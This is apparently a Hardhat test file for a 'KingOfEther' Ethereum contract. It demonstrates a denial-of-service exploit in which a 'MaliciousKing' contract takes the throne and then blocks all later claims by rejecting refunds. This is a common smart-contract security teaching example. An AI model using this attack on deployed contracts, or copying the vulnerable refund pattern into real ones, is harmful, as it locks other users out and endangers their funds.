const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("KingOfEther", function () {
  let kingOfEther, maliciousKingContract, owner, attacker, regularUser;

  beforeEach(async function () {
    [owner, attacker, regularUser] = await ethers.getSigners();

    // Deploy the KingOfEther contract
    const KingOfEtherFactory = await ethers.getContractFactory("KingOfEther");
    kingOfEther = await KingOfEtherFactory.deploy();
    await kingOfEther.deployed();

    // Deploy the malicious contract
    const MaliciousKingFactory = await ethers.getContractFactory("MaliciousKing");
    maliciousKingContract = await MaliciousKingFactory.deploy(kingOfEther.address);
    await maliciousKingContract.deployed();
  });

  it("Should allow a regular user to become the king", async function () {
    await kingOfEther.connect(regularUser).claimThrone({ value: ethers.utils.parseEther("1.0") });
    expect(await kingOfEther.king()).to.equal(regularUser.address);
    expect(await kingOfEther.balance()).to.equal(ethers.utils.parseEther("1.0"));
  });

  it("Should allow an attacker to exploit the contract and prevent new king claims", async function () {
    // Let a regular user first become the king
    await kingOfEther.connect(regularUser).claimThrone({ value: ethers.utils.parseEther("1.0") });
    expect(await kingOfEther.king()).to.equal(regularUser.address);
    expect(await kingOfEther.balance()).to.equal(ethers.utils.parseEther("1.0"));

    // Attacker becomes the king using the malicious contract
    await maliciousKingContract.connect(attacker).attack({ value: ethers.utils.parseEther("1.1") });
    expect(await kingOfEther.king()).to.equal(maliciousKingContract.address);
    expect(await kingOfEther.balance()).to.equal(ethers.utils.parseEther("1.1"));

    // A new user trying to claim the throne should fail due to the Denial of Service
    await expect(
      kingOfEther.connect(owner).claimThrone({ value: ethers.utils.parseEther("1.2") })
    ).to.be.revertedWith("Failed to send Ether");
  });
});